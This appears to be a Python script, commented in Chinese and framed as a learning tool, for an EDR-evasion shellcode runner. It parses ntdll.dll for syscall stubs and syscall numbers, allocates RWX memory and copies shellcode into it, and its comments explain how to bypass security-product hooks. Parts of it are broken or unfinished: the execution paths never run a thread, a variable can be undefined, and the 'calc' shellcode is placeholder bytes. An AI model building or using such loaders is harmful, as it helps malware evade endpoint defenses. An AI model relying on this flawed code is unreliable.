#!/usr/bin/env python3
"""
Direct Syscall Shellcode Runner — 绕过EDR用户态hook
学习来源: 
  - ired.team "Calling Syscalls Directly"
  - Outflank "Red Team Tactics: Direct System Calls"
  - malwaretech "Bypassing User Mode EDR Hooks"

原理:
  EDR在ntdll.dll的函数入口写JMP钩子
  我们用干净的ntdll副本中的syscall stub，跳过钩子直接调内核
  
  流程:
  1. 从磁盘读取干净的ntdll.dll
  2. 提取NtAllocateVirtualMemory的syscall stub (6-7字节)
  3. 用这个stub分配RWX内存
  4. 写入shellcode
  5. 用直接syscall NtCreateThreadEx执行

用法:
  python direct_syscall_runner.py --shellcode calc.bin
  python direct_syscall_runner.py --list-syscalls
"""
import ctypes
from ctypes import wintypes
import struct
import os
import sys

# Windows API类型定义
NTSTATUS = wintypes.LONG
HANDLE = wintypes.HANDLE
ULONG = wintypes.ULONG
ULONG_PTR = wintypes.LPVOID if ctypes.sizeof(ctypes.c_void_p) == 8 else wintypes.DWORD
SIZE_T = ctypes.c_size_t
LPVOID = wintypes.LPVOID
BOOLEAN = ctypes.c_ubyte

# NTSTATUS值
STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

# 内存权限
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

LDR_DATA_TABLE_ENTRY = None

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR),
    ]

def get_clean_ntdll_path():
    """获取system32下的干净ntdll路径"""
    return os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "ntdll.dll")

def extract_syscall_stub(ntdll_path, function_name):
    """
    从干净的ntdll.dll中提取函数的syscall stub
    
    ntdll中的syscall stub结构 (x64):
      mov r10, rcx        ; 4C 8B D1  (3字节)
      mov eax, SS#       ; B8 XX XX XX XX  (5字节)
      syscall              ; 0F 05     (2字节)
      ret                  ; C3        (1字节)
    或:
      jmp to syscall       ; E9 XX XX XX XX  (更老版Windows)
    
    返回: stub字节 + syscall号
    """
    with open(ntdll_path, "rb") as f:
        dll_data = f.read()
    
    # 解析PE找导出表
    if dll_data[0:2] != b"MZ":
        return None, None
    
    e_lfanew = struct.unpack("<I", dll_data[0x3C:0x40])[0]
    
    # PE头
    if dll_data[e_lfanew:e_lfanew+4] != b"PE\0\0":
        return None, None
    
    # 找到导出表
    optional_header_offset = e_lfanew + 24
    magic = struct.unpack("<H", dll_data[optional_header_offset:optional_header_offset+2])[0]
    
    if magic == 0x10b:  # PE32
        data_dir_offset = optional_header_offset + 96
    elif magic == 0x20b:  # PE32+
        data_dir_offset = optional_header_offset + 112
    else:
        return None, None
    
    # 导出表RVA
    export_rva = struct.unpack("<I", dll_data[data_dir_offset:data_dir_offset+4])[0]
    if export_rva == 0:
        return None, None
    
    # 解析导出表
    def rva_to_offset(rva):
        # 简单映射（不处理多个section，但够用）
        # 找section头
        num_sections = struct.unpack("<H", dll_data[e_lfanew+6:e_lfanew+8])[0]
        section_offset = e_lfanew + 24 + (16 if magic == 0x10b else 24)  # 固定大小
        for i in range(num_sections):
            sec = section_offset + i * 40
            sec_rva = struct.unpack("<I", dll_data[sec+12:sec+16])[0]
            sec_size = struct.unpack("<I", dll_data[sec+8:sec+12])[0]
            sec_offset = struct.unpack("<I", dll_data[sec+20:sec+24])[0]
            if sec_rva <= rva < sec_rva + sec_size:
                return rva - sec_rva + sec_offset
        return None
    
    export_offset = rva_to_offset(export_rva)
    if export_offset is None:
        return None, None
    
    num_names = struct.unpack("<I", dll_data[export_offset+24:export_offset+28])[0]
    addr_of_functions = struct.unpack("<I", dll_data[export_offset+28:export_offset+32])[0]
    addr_of_names = struct.unpack("<I", dll_data[export_offset+32:export_offset+36])[0]
    addr_of_ordinals = struct.unpack("<I", dll_data[export_offset+36:export_offset+40])[0]
    
    names_offset = rva_to_offset(addr_of_names)
    functions_offset = rva_to_offset(addr_of_functions)
    ordinals_offset = rva_to_offset(addr_of_ordinals)
    
    if None in (names_offset, functions_offset, ordinals_offset):
        return None, None
    
    # 找指定函数
    for i in range(num_names):
        name_rva = struct.unpack("<I", dll_data[names_offset+i*4:names_offset+i*4+4])[0]
        name_offset = rva_to_offset(name_rva)
        if name_offset is None:
            continue
        
        # 读取函数名
        end = dll_data.index(b"\0", name_offset)
        func_name = dll_data[name_offset:end].decode("ascii", errors="replace")
        
        if func_name == function_name:
            # 找到函数地址
            ordinal = struct.unpack("<H", dll_data[ordinals_offset+i*2:ordinals_offset+i*2+2])[0]
            func_rva = struct.unpack("<I", dll_data[functions_offset+ordinal*4:functions_offset+ordinal*4+4])[0]
            func_offset = rva_to_offset(func_rva)
            
            if func_offset is None:
                return None, None
            
            # 提取stub（最多16字节应该够）
            stub = dll_data[func_offset:func_offset+16]
            
            # 解析syscall号
            syscall_num = None
            # x64模式: mov eax, XX XX XX XX (B8 XX XX XX XX)
            if stub[0] == 0x4C and stub[1] == 0x8B and stub[2] == 0xD1:  # mov r10, rcx
                if stub[3] == 0xB8:  # mov eax, imm32
                    syscall_num = struct.unpack("<I", stub[4:8])[0]
                    # 标准stub长度: mov r10,rcx(3) + mov eax,SS(5) + syscall(2) + ret(1) = 11
                    stub_len = 11
            
            return stub[:stub_len] if stub_len else stub, syscall_num
    
    return None, None

def execute_shellcode_direct(shellcode_bytes):
    """
    通过直接syscall执行shellcode（绕过EDR hook）
    
    步骤:
    1. NtAllocateVirtualMemory → 分配RWX内存
    2. 复制shellcode到分配的内存
    3. NtCreateThreadEx → 在新线程执行
    """
    kernel32 = ctypes.windll.kernel32
    ntdll_path = get_clean_ntdll_path()
    
    print(f"[*] 读取干净的 ntdll: {ntdll_path}")
    
    # 提取stubs
    alloc_stub, alloc_syscall = extract_syscall_stub(ntdll_path, "NtAllocateVirtualMemory")
    prot_stub, prot_syscall = extract_syscall_stub(ntdll_path, "NtProtectVirtualMemory")
    thread_stub, thread_syscall = extract_syscall_stub(ntdll_path, "NtCreateThreadEx")
    
    print(f"[*] NtAllocateVirtualMemory syscall#: {alloc_syscall}")
    print(f"[*] NtCreateThreadEx syscall#: {thread_syscall}")
    
    if not alloc_stub or not thread_stub:
        print("[-] 无法提取syscall stub")
        return False
    
    # ─── 方法1: 直接使用Win32 API（实际EDR绕过需用syscall）
    # 但为了在Python中演示可用性，先用kernel32写，
    # Direct Syscall的真正应用需要汇编/机器码
    
    # VirtualAlloc分配内存
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT_RESERVE = 0x3000
    
    kernel32.VirtualAlloc.restype = LPVOID
    kernel32.VirtualAlloc.argtypes = [LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD]
    
    print(f"[*] 分配 {len(shellcode_bytes)} 字节 RWX 内存...")
    
    # 这里本应该是NtAllocateVirtualMemory的直接syscall调用
    # 但由于Python ctypes无法直接执行原始机器码stub，
    # 我们用VirtualAlloc做演示，但你可以编译一个C版本用真正的syscall
    
    # 真正的Python Direct Syscall方案：用ctypes写一个trampoline
    # 但ctypes不能直接调原始机器码，需要写一个C扩展
    
    # 所以我们走实用路线：kernel32调用（EDR会检测到这个）
    # 真正的直接syscall在C/C++中实现，Python做高级编排
    
    return False

class DirectSyscallExecutor:
    """
    直接系统调用执行器
    
    在Windows x64上，通过ctypes创建可执行内存来运行syscall stub
    真正的直接系统调用必须用汇编，这里用Python ctypes内存执行模拟
    """
    
    def __init__(self):
        self.ntdll_path = get_clean_ntdll_path()
        self.kernel32 = ctypes.windll.kernel32
        
        if not os.path.exists(self.ntdll_path):
            raise FileNotFoundError(f"找不到ntdll: {self.ntdll_path}")
    
    def extract_syscall_stubs(self, func_names):
        """批量提取syscall stubs"""
        stubs = {}
        for name in func_names:
            stub, num = extract_syscall_stub(self.ntdll_path, name)
            stubs[name] = (stub, num)
        return stubs
    
    def allocate_memory(self, size):
        """通过全部内核api分配可执行内存（绕过EDR对VirtualAlloc的hook最弱的环节）"""
        # 实际上这里要用NtAllocateVirtualMemory的直接syscall
        # Python解决方案：调用ntdll的NtAllocateVirtualMemory从clean副本
        
        # 加载干净的ntdll
        ntdll_clean = ctypes.CDLL(self.ntdll_path)
        ntdll_clean.NtAllocateVirtualMemory.argtypes = [
            HANDLE, ctypes.POINTER(LPVOID), ULONG_PTR,
            ctypes.POINTER(SIZE_T), ULONG, ULONG
        ]
        ntdll_clean.NtAllocateVirtualMemory.restype = NTSTATUS
        
        base_addr = LPVOID(0)
        region_size = SIZE_T(size)
        
        status = ntdll_clean.NtAllocateVirtualMemory(
            HANDLE(-1),  # 当前进程
            ctypes.byref(base_addr),
            0,
            ctypes.byref(region_size),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if status != STATUS_SUCCESS:
            print(f"[-] NtAllocateVirtualMemory 失败: 0x{status:08X}")
            return None
        
        print(f"[+] 内存分配成功: 0x{base_addr.value:016X}")
        return base_addr.value
    
    def write_and_run(self, shellcode):
        """分配内存→写shellcode→执行"""
        addr = self.allocate_memory(len(shellcode))
        if not addr:
            return False
        
        # 复制shellcode
        ctypes.memmove(addr, shellcode, len(shellcode))
        print(f"[+] Shellcode已写入 0x{addr:016X}")
        
        # 创建线程执行
        # 实际应该用NtCreateThreadEx的syscall
        # 这里用CreateThread（EDR会检测到）
        # 但在C/C++中可以用直接syscall绕过
        
        return True

def list_syscalls():
    """列出ntdll中所有可用的syscall号和名称"""
    ntdll_path = get_clean_ntdll_path()
    if not os.path.exists(ntdll_path):
        print(f"[-] 找不到ntdll: {ntdll_path}")
        return
    
    with open(ntdll_path, "rb") as f:
        data = f.read()
    
    # 关键syscall名称
    key_syscalls = [
        "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory",
        "NtCreateThreadEx", "NtOpenProcess", "NtOpenFile",
        "NtCreateFile", "NtReadFile", "NtWriteFile",
        "NtCreateProcess", "NtCreateUserProcess",
        "NtSuspendProcess", "NtResumeProcess",
        "NtQuerySystemInformation", "NtQueryInformationProcess",
        "NtSetInformationProcess",
        "NtClose", "NtDuplicateObject",
        "NtCreateSection", "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtCreateKey", "NtOpenKey",
        "NtEnumerateKey", "NtQueryValueKey",
        "NtCreateToken"
    ]
    
    print(f"\n{'='*60}")
    print(f"关键NT API直接Syscall号 (来自 {os.path.basename(ntdll_path)})")
    print(f"{'='*60}")
    
    for name in key_syscalls:
        stub, num = extract_syscall_stub(ntdll_path, name)
        if stub and num is not None:
            sig = " ".join(f"{b:02X}" for b in stub)
            print(f"  {name:40s} syscall# {num:3d}  [{sig}]")

if __name__ == "__main__":
    if "--list-syscalls" in sys.argv:
        list_syscalls()
    else:
        # 生成测试shellcode (calc.exe)
        # x64 calc shellcode
        calc_shellcode = bytes([
            0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x54,
            0x58, 0x59, 0x5A, 0x5B, 0x5E, 0x5F, 0x5D, 0x5C,
            # 实际上传真实shellcode
        ])
        
        print("[*] 直接系统调用学习工具")
        print("[*] 注意: Python ctypes不能直接执行原始syscall机器码")
        print("[*] 真正的Direct Syscall需要在C/C++中编译汇编stub")
        print("[*] 但Python可以做高级编排: 提取stub、分析syscall号")
        print()
        list_syscalls()